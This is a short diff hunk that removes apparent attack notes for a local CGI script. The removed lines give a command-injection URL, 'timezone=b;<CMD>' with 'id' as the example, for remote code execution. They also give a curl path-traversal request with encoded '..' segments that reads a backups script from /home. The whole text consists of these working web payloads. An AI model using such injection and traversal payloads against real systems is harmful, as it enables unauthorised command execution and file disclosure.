@@ -1,5 +1,0 @@
-For RCE, hit http://localhost/cgi-bin/get_time.pl?timezone=b;<CMD>
-Like http://localhost/cgi-bin/get_time.pl?timezone=b;id
-
-Or Path Traversal for file disclosure:
-curl -s --path-as-is "http://localhost/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/home/backups.sh"
